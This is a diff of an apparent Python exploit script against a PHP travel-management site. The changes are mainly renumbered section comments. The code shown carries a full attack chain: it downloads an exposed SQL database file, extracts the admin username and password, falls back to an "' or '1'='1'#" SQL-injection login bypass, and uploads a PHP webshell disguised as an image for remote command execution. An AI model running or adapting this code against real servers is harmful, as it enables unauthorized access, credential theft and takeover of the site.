@@ -36,6 +36,7 @@ def header():
     return head
 
 if __name__ == "__main__":
+
 #1 | INIT
     print(header())
     #print(sig())
@@ -46,6 +47,8 @@ if __name__ == "__main__":
 
 global user
 global password
+
+#2 | FUNCTIONS
 
 def webshell(SERVER_URL, WEBSHELL_PATH, session):
     try:
@@ -76,13 +79,17 @@ def webshell(SERVER_URL, WEBSHELL_PATH, session):
         sys.exit(-1)
 
 
-print(info+'Attempting to exploit insecure permissions and download db file...')
+
 
 url = sys.argv[1] + '/travel/database/travel.sql'
 r = requests.get(url)
 server_url = sys.argv[1]
 login_url = sys.argv[1] + '/travel/admin/loginform.php'
 upload_url = sys.argv[1] + '/travel/admin/updatesubcategory.php'
+
+#3 | EXPLOIT
+
+print(info+'Attempting to exploit insecure permissions and download db file...')
 
 with open(sys.argv[2] + '/travel.sql', 'wb') as f:
     f.write(r.content)
@@ -110,8 +117,6 @@ with open(sys.argv[2] + "/travel.sql") as f:
                 password = password.replace(",", "")
                 print(ok+'Admin Username: ' + user + ' Password: ' + password)
                 found = True
-            #if not found:                      #fix this to only return 1 line
-            #    print('Admin creds not found in sql file...')
 
 
 print(info+'Locating and cleaning up artifact...')
@@ -120,7 +125,8 @@ if os.path.exists(sys.argv[2] + "/travel.sql"):
 else:
     print(err+'Artifact not found! Make sure you manually find and remove it...')
 print(info+'Attempting to connect...')
-#3 | Login
+
+#4 | LOGIN
     # Create a web session in python
 s = requests.Session()
     # GET request to webserver - Start a session & retrieve a session cookie
@@ -128,7 +134,6 @@ get_session = s.get(sys.argv[1], verify=False)
     # Check connection to website & print session cookie to terminal OR die
 if get_session.status_code == 200:
         print(ok+'Successfully connected to target server & created session.')
-#        print(info+"Session Cookie: " + get_session.headers['Set-Cookie'])
 else:
         print(err+'Cannot connect to the server and create a web session.')
         sys.exit(-1)
@@ -144,7 +149,8 @@ if loginchk == "[u'Admin Links']":
         print(ok+"Login successful.")
 else:
         print(err+"Failed login. The database file may not reflect the current phpmyadmin configuration. Trying login bypass...")
-#SQLi Login Bypass        
+
+#5 | SQLi Fail-Safe Login Bypass        
         sqli_data  = {'t1':"' or '1'='1'#", 't2':'hyd3sec','sbmt':'LOGIN'}
         print(info+"Attempting to execute SQLi bypass to login without credentials...")
         #auth        = s.post(url=login_url, data=sqli_data, verify=False, proxies=proxies)
@@ -158,7 +164,7 @@ else:
            sys.exit(-1)
 
 
-#3 | File Upload
+#6 | File Upload
 
     # Content-Disposition: form-data; name="image"; filename="hyd3sec.php"
     # Content-Type: image/png
@@ -176,7 +182,7 @@ print(info+"Exploiting image file upload vulnerability to upload and obfuscate s
 #upload_house = s.post(url=UPLOAD_URL, files=shellz, data=fdata, verify=False, proxies=proxies)
 upload_house = s.post(url=upload_url, files=shellz, data=fdata, verify=False)
 
-#4 | Get Webshell Upload Name
+#7 | Get Upload Name
 get_session2 = s.get(server_url + '/travel/admin/subcatimages/hyd3sec.php', verify=False)
 if get_session2.status_code == 200:
     print(ok+'Successfully uploaded malicious file...')
@@ -186,5 +192,5 @@ else:
 
 webshPath   = '/travel/admin/subcatimages/hyd3sec.php'
 
-#5 | interact with webshell for Remote Command Execution
+#8 | RCE
 webshell(server_url, webshPath, s)
